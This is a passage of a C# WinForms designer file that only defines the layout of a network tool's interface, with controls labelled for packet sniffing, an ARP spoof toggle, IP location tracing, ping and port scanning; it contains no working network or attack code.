            this.metroLabel17.UseStyleColors = true;
            // 
            // metroLabel14
            // 
            this.metroLabel14.AutoSize = true;
            this.metroLabel14.FontSize = MetroFramework.MetroLabelSize.Tall;
            this.metroLabel14.FontWeight = MetroFramework.MetroLabelWeight.Regular;
            this.metroLabel14.Location = new System.Drawing.Point(78, 0);
            this.metroLabel14.Name = "metroLabel14";
            this.metroLabel14.Size = new System.Drawing.Size(0, 0);
            this.metroLabel14.TabIndex = 7;
            this.metroLabel14.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroLabel14.UseStyleColors = true;
            // 
            // metroLabel13
            // 
            this.metroLabel13.AutoSize = true;
            this.metroLabel13.FontSize = MetroFramework.MetroLabelSize.Tall;
            this.metroLabel13.FontWeight = MetroFramework.MetroLabelWeight.Regular;
            this.metroLabel13.Location = new System.Drawing.Point(3, 0);
            this.metroLabel13.Name = "metroLabel13";
            this.metroLabel13.Size = new System.Drawing.Size(108, 25);
            this.metroLabel13.TabIndex = 6;
            this.metroLabel13.Text = "Ping Result: ";
            this.metroLabel13.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroLabel13.UseStyleColors = true;
            // 
            // metroPanel8
            // 
            this.metroPanel8.Controls.Add(this.metroButton6);
            this.metroPanel8.Controls.Add(this.metroTextBox6);
            this.metroPanel8.Controls.Add(this.metroButton5);
            this.metroPanel8.Controls.Add(this.metroLabel12);
            this.metroPanel8.HorizontalScrollbarBarColor = true;
            this.metroPanel8.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel8.HorizontalScrollbarSize = 10;
            this.metroPanel8.Location = new System.Drawing.Point(0, 3);
            this.metroPanel8.Name = "metroPanel8";
            this.metroPanel8.Size = new System.Drawing.Size(644, 31);
            this.metroPanel8.TabIndex = 17;
            this.metroPanel8.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel8.VerticalScrollbarBarColor = true;
            this.metroPanel8.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel8.VerticalScrollbarSize = 10;
            // 
            // metroButton6
            // 
            this.metroButton6.Location = new System.Drawing.Point(502, 3);
            this.metroButton6.Name = "metroButton6";
            this.metroButton6.Size = new System.Drawing.Size(137, 23);
            this.metroButton6.TabIndex = 12;
            this.metroButton6.Text = "Scan Ports";
            this.metroButton6.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroButton6.UseSelectable = true;
            this.metroButton6.UseStyleColors = true;
            this.metroButton6.Click += new System.EventHandler(this.metroButton6_Click);
            // 
            // metroTextBox6
            // 
            this.metroTextBox6.FontSize = MetroFramework.MetroTextBoxSize.Medium;
            this.metroTextBox6.Lines = new string[0];
            this.metroTextBox6.Location = new System.Drawing.Point(85, 3);
            this.metroTextBox6.MaxLength = 32767;
            this.metroTextBox6.Name = "metroTextBox6";
            this.metroTextBox6.PasswordChar = '\0';
            this.metroTextBox6.ScrollBars = System.Windows.Forms.ScrollBars.None;
            this.metroTextBox6.SelectedText = "";
            this.metroTextBox6.Size = new System.Drawing.Size(265, 23);
            this.metroTextBox6.TabIndex = 7;
            this.metroTextBox6.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroTextBox6.UseSelectable = true;
            // 
            // metroButton5
            // 
            this.metroButton5.Location = new System.Drawing.Point(356, 3);
            this.metroButton5.Name = "metroButton5";
            this.metroButton5.Size = new System.Drawing.Size(137, 23);
            this.metroButton5.TabIndex = 11;
            this.metroButton5.Text = "Ping IP";
            this.metroButton5.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroButton5.UseSelectable = true;
            this.metroButton5.UseStyleColors = true;
            this.metroButton5.Click += new System.EventHandler(this.metroButton5_Click);
            // 
            // metroLabel12
            // 
            this.metroLabel12.AutoSize = true;
            this.metroLabel12.FontSize = MetroFramework.MetroLabelSize.Tall;
            this.metroLabel12.FontWeight = MetroFramework.MetroLabelWeight.Regular;
            this.metroLabel12.Location = new System.Drawing.Point(3, 0);
            this.metroLabel12.Name = "metroLabel12";
            this.metroLabel12.Size = new System.Drawing.Size(76, 25);
            this.metroLabel12.TabIndex = 6;
            this.metroLabel12.Text = "Enter IP:";
            this.metroLabel12.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroLabel12.UseStyleColors = true;
            // 
            // locationTab
            // 
            this.locationTab.Controls.Add(this.metroPanel7);
            this.locationTab.Controls.Add(this.metroPanel6);
            this.locationTab.HorizontalScrollbarBarColor = true;
            this.locationTab.HorizontalScrollbarHighlightOnWheel = false;
            this.locationTab.HorizontalScrollbarSize = 10;
            this.locationTab.Location = new System.Drawing.Point(4, 38);
            this.locationTab.Name = "locationTab";
            this.locationTab.Size = new System.Drawing.Size(643, 317);
            this.locationTab.TabIndex = 2;
            this.locationTab.Text = "Location Finder";
            this.locationTab.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.locationTab.UseStyleColors = true;
            this.locationTab.VerticalScrollbarBarColor = true;
            this.locationTab.VerticalScrollbarHighlightOnWheel = false;
            this.locationTab.VerticalScrollbarSize = 10;
            this.locationTab.Visible = false;
            // 
            // metroPanel7
            // 
            this.metroPanel7.Controls.Add(this.metroTile1);
            this.metroPanel7.Controls.Add(this.metroTextBox5);
            this.metroPanel7.Controls.Add(this.metroLabel11);
            this.metroPanel7.Controls.Add(this.metroTextBox4);
            this.metroPanel7.Controls.Add(this.metroLabel10);
            this.metroPanel7.Controls.Add(this.metroTextBox3);
            this.metroPanel7.Controls.Add(this.metroLabel9);
            this.metroPanel7.Controls.Add(this.metroTextBox1);
            this.metroPanel7.Controls.Add(this.metroLabel6);
            this.metroPanel7.HorizontalScrollbarBarColor = true;
            this.metroPanel7.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel7.HorizontalScrollbarSize = 10;
            this.metroPanel7.Location = new System.Drawing.Point(0, 40);
            this.metroPanel7.Name = "metroPanel7";
            this.metroPanel7.Size = new System.Drawing.Size(644, 118);
            this.metroPanel7.TabIndex = 17;
            this.metroPanel7.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel7.VerticalScrollbarBarColor = true;
            this.metroPanel7.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel7.VerticalScrollbarSize = 10;
            // 
            // metroTile1
            // 
            this.metroTile1.ActiveControl = null;
            this.metroTile1.Enabled = false;
            this.metroTile1.Location = new System.Drawing.Point(356, 3);
            this.metroTile1.Name = "metroTile1";
            this.metroTile1.Size = new System.Drawing.Size(283, 109);
            this.metroTile1.Style = MetroFramework.MetroColorStyle.Red;
            this.metroTile1.TabIndex = 14;
            this.metroTile1.Text = "The City-Result isn\'t accurate everytime";
            this.metroTile1.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            this.metroTile1.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroTile1.TileTextFontWeight = MetroFramework.MetroTileTextWeight.Regular;
            this.metroTile1.UseSelectable = true;
            // 
            // metroTextBox5
            // 
            this.metroTextBox5.FontSize = MetroFramework.MetroTextBoxSize.Medium;
            this.metroTextBox5.Lines = new string[0];
            this.metroTextBox5.Location = new System.Drawing.Point(102, 90);
            this.metroTextBox5.MaxLength = 32767;
            this.metroTextBox5.Name = "metroTextBox5";
            this.metroTextBox5.PasswordChar = '\0';
            this.metroTextBox5.ReadOnly = true;
            this.metroTextBox5.ScrollBars = System.Windows.Forms.ScrollBars.None;
            this.metroTextBox5.SelectedText = "";
            this.metroTextBox5.Size = new System.Drawing.Size(248, 23);
            this.metroTextBox5.TabIndex = 13;
            this.metroTextBox5.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroTextBox5.UseSelectable = true;
            // 
            // metroLabel11
            // 
            this.metroLabel11.AutoSize = true;
            this.metroLabel11.FontSize = MetroFramework.MetroLabelSize.Tall;
            this.metroLabel11.FontWeight = MetroFramework.MetroLabelWeight.Regular;
            this.metroLabel11.Location = new System.Drawing.Point(3, 87);
            this.metroLabel11.Name = "metroLabel11";
            this.metroLabel11.Size = new System.Drawing.Size(46, 25);
            this.metroLabel11.TabIndex = 12;
            this.metroLabel11.Text = "City:";
            this.metroLabel11.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroLabel11.UseStyleColors = true;
            // 
            // metroTextBox4
            // 
            this.metroTextBox4.FontSize = MetroFramework.MetroTextBoxSize.Medium;
            this.metroTextBox4.Lines = new string[0];
            this.metroTextBox4.Location = new System.Drawing.Point(102, 61);
            this.metroTextBox4.MaxLength = 32767;
            this.metroTextBox4.Name = "metroTextBox4";
            this.metroTextBox4.PasswordChar = '\0';
            this.metroTextBox4.ReadOnly = true;
            this.metroTextBox4.ScrollBars = System.Windows.Forms.ScrollBars.None;
            this.metroTextBox4.SelectedText = "";
            this.metroTextBox4.Size = new System.Drawing.Size(248, 23);
            this.metroTextBox4.TabIndex = 11;
            this.metroTextBox4.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroTextBox4.UseSelectable = true;
            // 
            // metroLabel10
            // 
            this.metroLabel10.AutoSize = true;
            this.metroLabel10.FontSize = MetroFramework.MetroLabelSize.Tall;
            this.metroLabel10.FontWeight = MetroFramework.MetroLabelWeight.Regular;
            this.metroLabel10.Location = new System.Drawing.Point(3, 58);
            this.metroLabel10.Name = "metroLabel10";
            this.metroLabel10.Size = new System.Drawing.Size(71, 25);
            this.metroLabel10.TabIndex = 10;
            this.metroLabel10.Text = "Region:";
            this.metroLabel10.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroLabel10.UseStyleColors = true;
            // 
            // metroTextBox3
            // 
            this.metroTextBox3.FontSize = MetroFramework.MetroTextBoxSize.Medium;
            this.metroTextBox3.Lines = new string[0];
            this.metroTextBox3.Location = new System.Drawing.Point(102, 32);
            this.metroTextBox3.MaxLength = 32767;
            this.metroTextBox3.Name = "metroTextBox3";
            this.metroTextBox3.PasswordChar = '\0';
            this.metroTextBox3.ReadOnly = true;
            this.metroTextBox3.ScrollBars = System.Windows.Forms.ScrollBars.None;
            this.metroTextBox3.SelectedText = "";
            this.metroTextBox3.Size = new System.Drawing.Size(248, 23);
            this.metroTextBox3.TabIndex = 9;
            this.metroTextBox3.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroTextBox3.UseSelectable = true;
            // 
            // metroLabel9
            // 
            this.metroLabel9.AutoSize = true;
            this.metroLabel9.FontSize = MetroFramework.MetroLabelSize.Tall;
            this.metroLabel9.FontWeight = MetroFramework.MetroLabelWeight.Regular;
            this.metroLabel9.Location = new System.Drawing.Point(3, 29);
            this.metroLabel9.Name = "metroLabel9";
            this.metroLabel9.Size = new System.Drawing.Size(79, 25);
            this.metroLabel9.TabIndex = 8;
            this.metroLabel9.Text = "Country:";
            this.metroLabel9.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroLabel9.UseStyleColors = true;
            // 
            // metroTextBox1
            // 
            this.metroTextBox1.FontSize = MetroFramework.MetroTextBoxSize.Medium;
            this.metroTextBox1.Lines = new string[0];
            this.metroTextBox1.Location = new System.Drawing.Point(102, 3);
            this.metroTextBox1.MaxLength = 32767;
            this.metroTextBox1.Name = "metroTextBox1";
            this.metroTextBox1.PasswordChar = '\0';
            this.metroTextBox1.ReadOnly = true;
            this.metroTextBox1.ScrollBars = System.Windows.Forms.ScrollBars.None;
            this.metroTextBox1.SelectedText = "";
            this.metroTextBox1.Size = new System.Drawing.Size(248, 23);
            this.metroTextBox1.TabIndex = 7;
            this.metroTextBox1.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroTextBox1.UseSelectable = true;
            // 
            // metroLabel6
            // 
            this.metroLabel6.AutoSize = true;
            this.metroLabel6.FontSize = MetroFramework.MetroLabelSize.Tall;
            this.metroLabel6.FontWeight = MetroFramework.MetroLabelWeight.Regular;
            this.metroLabel6.Location = new System.Drawing.Point(3, 0);
            this.metroLabel6.Name = "metroLabel6";
            this.metroLabel6.Size = new System.Drawing.Size(82, 25);
            this.metroLabel6.TabIndex = 6;
            this.metroLabel6.Text = "Provider:";
            this.metroLabel6.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroLabel6.UseStyleColors = true;
            // 
            // metroPanel6
            // 
            this.metroPanel6.Controls.Add(this.metroTextBox2);
            this.metroPanel6.Controls.Add(this.metroButton3);
            this.metroPanel6.Controls.Add(this.metroLabel8);
            this.metroPanel6.HorizontalScrollbarBarColor = true;
            this.metroPanel6.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel6.HorizontalScrollbarSize = 10;
            this.metroPanel6.Location = new System.Drawing.Point(0, 3);
            this.metroPanel6.Name = "metroPanel6";
            this.metroPanel6.Size = new System.Drawing.Size(644, 31);
            this.metroPanel6.TabIndex = 16;
            this.metroPanel6.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel6.VerticalScrollbarBarColor = true;
            this.metroPanel6.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel6.VerticalScrollbarSize = 10;
            // 
            // metroTextBox2
            // 
            this.metroTextBox2.FontSize = MetroFramework.MetroTextBoxSize.Medium;
            this.metroTextBox2.Lines = new string[0];
            this.metroTextBox2.Location = new System.Drawing.Point(85, 3);
            this.metroTextBox2.MaxLength = 32767;
            this.metroTextBox2.Name = "metroTextBox2";
            this.metroTextBox2.PasswordChar = '\0';
            this.metroTextBox2.ScrollBars = System.Windows.Forms.ScrollBars.None;
            this.metroTextBox2.SelectedText = "";
            this.metroTextBox2.Size = new System.Drawing.Size(265, 23);
            this.metroTextBox2.TabIndex = 7;
            this.metroTextBox2.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroTextBox2.UseSelectable = true;
            // 
            // metroButton3
            // 
            this.metroButton3.Location = new System.Drawing.Point(356, 3);
            this.metroButton3.Name = "metroButton3";
            this.metroButton3.Size = new System.Drawing.Size(283, 23);
            this.metroButton3.TabIndex = 11;
            this.metroButton3.Text = "Trace Location";
            this.metroButton3.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroButton3.UseSelectable = true;
            this.metroButton3.UseStyleColors = true;
            this.metroButton3.Click += new System.EventHandler(this.metroButton3_Click);
            // 
            // metroLabel8
            // 
            this.metroLabel8.AutoSize = true;
            this.metroLabel8.FontSize = MetroFramework.MetroLabelSize.Tall;
            this.metroLabel8.FontWeight = MetroFramework.MetroLabelWeight.Regular;
            this.metroLabel8.Location = new System.Drawing.Point(3, 0);
            this.metroLabel8.Name = "metroLabel8";
            this.metroLabel8.Size = new System.Drawing.Size(76, 25);
            this.metroLabel8.TabIndex = 6;
            this.metroLabel8.Text = "Enter IP:";
            this.metroLabel8.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroLabel8.UseStyleColors = true;
            // 
            // snifferTab
            // 
            this.snifferTab.Controls.Add(this.metroPanel9);
            this.snifferTab.HorizontalScrollbarBarColor = true;
            this.snifferTab.HorizontalScrollbarHighlightOnWheel = false;
            this.snifferTab.HorizontalScrollbarSize = 10;
            this.snifferTab.Location = new System.Drawing.Point(4, 38);
            this.snifferTab.Name = "snifferTab";
            this.snifferTab.Size = new System.Drawing.Size(643, 317);
            this.snifferTab.Style = MetroFramework.MetroColorStyle.Black;
            this.snifferTab.TabIndex = 1;
            this.snifferTab.Text = "Sniffer";
            this.snifferTab.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.snifferTab.VerticalScrollbarBarColor = true;
            this.snifferTab.VerticalScrollbarHighlightOnWheel = false;
            this.snifferTab.VerticalScrollbarSize = 10;
            this.snifferTab.Visible = false;
            this.snifferTab.Click += new System.EventHandler(this.SnifferTab_Click);
            // 
            // metroPanel9
            // 
            this.metroPanel9.Controls.Add(this.metroButton7);
            this.metroPanel9.Controls.Add(this.metroButton1);
            this.metroPanel9.Controls.Add(this.metroButton2);
            this.metroPanel9.Controls.Add(this.dataGridView1);
            this.metroPanel9.Controls.Add(this.refreshButton);
            this.metroPanel9.HorizontalScrollbarBarColor = true;
            this.metroPanel9.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel9.HorizontalScrollbarSize = 10;
            this.metroPanel9.Location = new System.Drawing.Point(0, 3);
            this.metroPanel9.Name = "metroPanel9";
            this.metroPanel9.Size = new System.Drawing.Size(644, 306);
            this.metroPanel9.TabIndex = 16;
            this.metroPanel9.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel9.VerticalScrollbarBarColor = true;
            this.metroPanel9.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel9.VerticalScrollbarSize = 10;
            // 
            // metroButton7
            // 
            this.metroButton7.Location = new System.Drawing.Point(165, 271);
            this.metroButton7.Name = "metroButton7";
            this.metroButton7.Size = new System.Drawing.Size(154, 30);
            this.metroButton7.TabIndex = 17;
            this.metroButton7.Text = "Delete All Entries";
            this.metroButton7.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroButton7.UseSelectable = true;
            this.metroButton7.UseStyleColors = true;
            this.metroButton7.Click += new System.EventHandler(this.metroButton7_Click);
            // 
            // metroButton1
            // 
            this.metroButton1.Location = new System.Drawing.Point(4, 271);
            this.metroButton1.Name = "metroButton1";
            this.metroButton1.Size = new System.Drawing.Size(155, 30);
            this.metroButton1.TabIndex = 16;
            this.metroButton1.Text = "Open Labels Textfile";
            this.metroButton1.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroButton1.UseSelectable = true;
            this.metroButton1.UseStyleColors = true;
            this.metroButton1.Click += new System.EventHandler(this.metroButton1_Click_1);
            // 
            // metroButton2
            // 
            this.metroButton2.Location = new System.Drawing.Point(325, 271);
            this.metroButton2.Name = "metroButton2";
            this.metroButton2.Size = new System.Drawing.Size(154, 30);
            this.metroButton2.TabIndex = 15;
            this.metroButton2.Text = "Clear All Labels";
            this.metroButton2.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroButton2.UseSelectable = true;
            this.metroButton2.UseStyleColors = true;
            this.metroButton2.Click += new System.EventHandler(this.metroButton2_Click);
            // 
            // dataGridView1
            // 
            this.dataGridView1.AllowUserToAddRows = false;
            this.dataGridView1.AllowUserToDeleteRows = false;
            this.dataGridView1.AllowUserToResizeRows = false;
            this.dataGridView1.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.dataGridView1.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
            this.dataGridView1.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
            this.dataGridView1.ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.Disable;
            this.dataGridView1.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
            this.dataGridView1.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
            this.dataGridView1.Location = new System.Drawing.Point(3, 3);
            this.dataGridView1.MultiSelect = false;
            this.dataGridView1.Name = "dataGridView1";
            this.dataGridView1.ReadOnly = true;
            this.dataGridView1.RowHeadersVisible = false;
            this.dataGridView1.RowTemplate.Height = 24;
            this.dataGridView1.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
            this.dataGridView1.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
            this.dataGridView1.ShowEditingIcon = false;
            this.dataGridView1.Size = new System.Drawing.Size(636, 262);
            this.dataGridView1.TabIndex = 0;
            this.dataGridView1.MouseUp += new System.Windows.Forms.MouseEventHandler(this.dataGridView1_MouseUp);
            // 
            // refreshButton
            // 
            this.refreshButton.Location = new System.Drawing.Point(485, 271);
            this.refreshButton.Name = "refreshButton";
            this.refreshButton.Size = new System.Drawing.Size(154, 30);
            this.refreshButton.TabIndex = 14;
            this.refreshButton.Text = "Refresh";
            this.refreshButton.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.refreshButton.UseSelectable = true;
            this.refreshButton.UseStyleColors = true;
            this.refreshButton.Click += new System.EventHandler(this.refreshButton_Click);
            // 
            // mainTab
            // 
            this.mainTab.Controls.Add(this.metroButton4);
            this.mainTab.Controls.Add(this.metroPanel5);
            this.mainTab.Controls.Add(this.metroPanel4);
            this.mainTab.Controls.Add(this.metroPanel3);
            this.mainTab.Controls.Add(this.metroPanel2);
            this.mainTab.Controls.Add(this.metroPanel1);
            this.mainTab.HorizontalScrollbarBarColor = true;
            this.mainTab.HorizontalScrollbarHighlightOnWheel = false;
            this.mainTab.HorizontalScrollbarSize = 10;
            this.mainTab.Location = new System.Drawing.Point(4, 38);
            this.mainTab.Name = "mainTab";
            this.mainTab.Size = new System.Drawing.Size(643, 317);
            this.mainTab.TabIndex = 0;
            this.mainTab.Text = "Main";
            this.mainTab.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.mainTab.UseStyleColors = true;
            this.mainTab.VerticalScrollbarBarColor = true;
            this.mainTab.VerticalScrollbarHighlightOnWheel = false;
            this.mainTab.VerticalScrollbarSize = 10;
            // 
            // metroButton4
            // 
            this.metroButton4.FontSize = MetroFramework.MetroButtonSize.Tall;
            this.metroButton4.Location = new System.Drawing.Point(0, 263);
            this.metroButton4.Name = "metroButton4";
            this.metroButton4.Size = new System.Drawing.Size(213, 40);
            this.metroButton4.TabIndex = 12;
            this.metroButton4.Text = "Start Sniffing";
            this.metroButton4.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroButton4.UseSelectable = true;
            this.metroButton4.UseStyleColors = true;
            // 
            // metroPanel5
            // 
            this.metroPanel5.Controls.Add(this.startButton);
            this.metroPanel5.HorizontalScrollbarBarColor = true;
            this.metroPanel5.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel5.HorizontalScrollbarSize = 10;
            this.metroPanel5.Location = new System.Drawing.Point(0, 180);
            this.metroPanel5.Name = "metroPanel5";
            this.metroPanel5.Size = new System.Drawing.Size(644, 67);
            this.metroPanel5.TabIndex = 12;
            this.metroPanel5.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel5.VerticalScrollbarBarColor = true;
            this.metroPanel5.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel5.VerticalScrollbarSize = 10;
            // 
            // startButton
            // 
            this.startButton.FontSize = MetroFramework.MetroButtonSize.Tall;
            this.startButton.Location = new System.Drawing.Point(3, 3);
            this.startButton.Name = "startButton";
            this.startButton.Size = new System.Drawing.Size(636, 59);
            this.startButton.TabIndex = 11;
            this.startButton.Text = "Start Sniffing";
            this.startButton.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.startButton.UseSelectable = true;
            this.startButton.UseStyleColors = true;
            this.startButton.Click += new System.EventHandler(this.startButton_Click);
            // 
            // metroPanel4
            // 
            this.metroPanel4.Controls.Add(this.browseButton);
            this.metroPanel4.Controls.Add(this.savePath);
            this.metroPanel4.Controls.Add(this.metroLabel7);
            this.metroPanel4.HorizontalScrollbarBarColor = true;
            this.metroPanel4.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel4.HorizontalScrollbarSize = 10;
            this.metroPanel4.Location = new System.Drawing.Point(0, 143);
            this.metroPanel4.Name = "metroPanel4";
            this.metroPanel4.Size = new System.Drawing.Size(644, 31);
            this.metroPanel4.TabIndex = 10;
            this.metroPanel4.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel4.VerticalScrollbarBarColor = true;
            this.metroPanel4.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel4.VerticalScrollbarSize = 10;
            // 
            // browseButton
            // 
            this.browseButton.Location = new System.Drawing.Point(564, 3);
            this.browseButton.Name = "browseButton";
            this.browseButton.Size = new System.Drawing.Size(75, 23);
            this.browseButton.TabIndex = 11;
            this.browseButton.Text = "Browse";
            this.browseButton.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.browseButton.UseSelectable = true;
            this.browseButton.UseStyleColors = true;
            this.browseButton.Click += new System.EventHandler(this.browseButton_Click);
            // 
            // savePath
            // 
            this.savePath.FontSize = MetroFramework.MetroTextBoxSize.Medium;
            this.savePath.Lines = new string[0];
            this.savePath.Location = new System.Drawing.Point(99, 3);
            this.savePath.MaxLength = 32767;
            this.savePath.Name = "savePath";
            this.savePath.PasswordChar = '\0';
            this.savePath.ReadOnly = true;
            this.savePath.ScrollBars = System.Windows.Forms.ScrollBars.None;
            this.savePath.SelectedText = "";
            this.savePath.Size = new System.Drawing.Size(459, 23);
            this.savePath.TabIndex = 7;
            this.savePath.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.savePath.UseSelectable = true;
            // 
            // metroLabel7
            // 
            this.metroLabel7.AutoSize = true;
            this.metroLabel7.FontSize = MetroFramework.MetroLabelSize.Tall;
            this.metroLabel7.FontWeight = MetroFramework.MetroLabelWeight.Regular;
            this.metroLabel7.Location = new System.Drawing.Point(3, 0);
            this.metroLabel7.Name = "metroLabel7";
            this.metroLabel7.Size = new System.Drawing.Size(65, 25);
            this.metroLabel7.TabIndex = 6;
            this.metroLabel7.Text = "Labels:";
            this.metroLabel7.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroLabel7.UseStyleColors = true;
            // 
            // metroPanel3
            // 
            this.metroPanel3.Controls.Add(this.fromIPARP);
            this.metroPanel3.Controls.Add(this.toIPARP);
            this.metroPanel3.Controls.Add(this.metroLabel5);
            this.metroPanel3.Controls.Add(this.metroLabel1);
            this.metroPanel3.Controls.Add(this.arpSpoofToggle);
            this.metroPanel3.Controls.Add(this.metroLabel3);
            this.metroPanel3.HorizontalScrollbarBarColor = true;
            this.metroPanel3.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel3.HorizontalScrollbarSize = 10;
            this.metroPanel3.Location = new System.Drawing.Point(0, 79);
            this.metroPanel3.Name = "metroPanel3";
            this.metroPanel3.Size = new System.Drawing.Size(644, 58);
            this.metroPanel3.TabIndex = 10;
            this.metroPanel3.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel3.VerticalScrollbarBarColor = true;
            this.metroPanel3.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel3.VerticalScrollbarSize = 10;
            // 
            // fromIPARP
            // 
            this.fromIPARP.Enabled = false;
            this.fromIPARP.FormattingEnabled = true;
            this.fromIPARP.ItemHeight = 23;
            this.fromIPARP.Location = new System.Drawing.Point(99, 24);
            this.fromIPARP.Name = "fromIPARP";
            this.fromIPARP.Size = new System.Drawing.Size(181, 29);
            this.fromIPARP.TabIndex = 13;
            this.fromIPARP.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.fromIPARP.UseSelectable = true;
            this.fromIPARP.UseStyleColors = true;
            // 
            // toIPARP
            // 
            this.toIPARP.Enabled = false;
            this.toIPARP.FormattingEnabled = true;
            this.toIPARP.ItemHeight = 23;
            this.toIPARP.Location = new System.Drawing.Point(458, 24);
            this.toIPARP.Name = "toIPARP";
            this.toIPARP.Size = new System.Drawing.Size(181, 29);
            this.toIPARP.TabIndex = 5;
            this.toIPARP.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.toIPARP.UseSelectable = true;
            this.toIPARP.UseStyleColors = true;
            // 
            // metroLabel5
            // 
            this.metroLabel5.AutoSize = true;
            this.metroLabel5.FontSize = MetroFramework.MetroLabelSize.Tall;
            this.metroLabel5.FontWeight = MetroFramework.MetroLabelWeight.Regular;
            this.metroLabel5.Location = new System.Drawing.Point(416, 26);
            this.metroLabel5.Name = "metroLabel5";
            this.metroLabel5.Size = new System.Drawing.Size(34, 25);
            this.metroLabel5.TabIndex = 12;
            this.metroLabel5.Text = "To:";
            this.metroLabel5.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroLabel5.UseStyleColors = true;
            // 
            // metroLabel1
            // 
            this.metroLabel1.AutoSize = true;
            this.metroLabel1.FontSize = MetroFramework.MetroLabelSize.Tall;
            this.metroLabel1.FontWeight = MetroFramework.MetroLabelWeight.Regular;
            this.metroLabel1.Location = new System.Drawing.Point(3, 26);
            this.metroLabel1.Name = "metroLabel1";
            this.metroLabel1.Size = new System.Drawing.Size(58, 25);
            this.metroLabel1.TabIndex = 10;
            this.metroLabel1.Text = "From:";
            this.metroLabel1.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroLabel1.UseStyleColors = true;
            // 
            // arpSpoofToggle
            // 
            this.arpSpoofToggle.AutoSize = true;
            this.arpSpoofToggle.DisplayStatus = false;
            this.arpSpoofToggle.FontSize = MetroFramework.MetroLinkSize.Medium;
            this.arpSpoofToggle.Location = new System.Drawing.Point(99, 5);
            this.arpSpoofToggle.Name = "arpSpoofToggle";
            this.arpSpoofToggle.Size = new System.Drawing.Size(50, 17);
            this.arpSpoofToggle.TabIndex = 5;
            this.arpSpoofToggle.Text = "Off";
            this.arpSpoofToggle.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.arpSpoofToggle.UseSelectable = true;
            this.arpSpoofToggle.UseStyleColors = true;
            this.arpSpoofToggle.CheckedChanged += new System.EventHandler(this.arpSpoofToggle_CheckedChanged);
            // 
            // metroLabel3
            // 
            this.metroLabel3.AutoSize = true;
            this.metroLabel3.FontSize = MetroFramework.MetroLabelSize.Tall;
            this.metroLabel3.FontWeight = MetroFramework.MetroLabelWeight.Regular;
            this.metroLabel3.Location = new System.Drawing.Point(3, 0);
            this.metroLabel3.Name = "metroLabel3";
            this.metroLabel3.Size = new System.Drawing.Size(99, 25);
            this.metroLabel3.TabIndex = 9;
            this.metroLabel3.Text = "ARP Spoof";
            this.metroLabel3.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroLabel3.UseStyleColors = true;
            // 
            // metroPanel2
            // 
            this.metroPanel2.Controls.Add(this.sourcePortBox);
            this.metroPanel2.Controls.Add(this.metroLabel4);
            this.metroPanel2.Controls.Add(this.sourceIPBox);
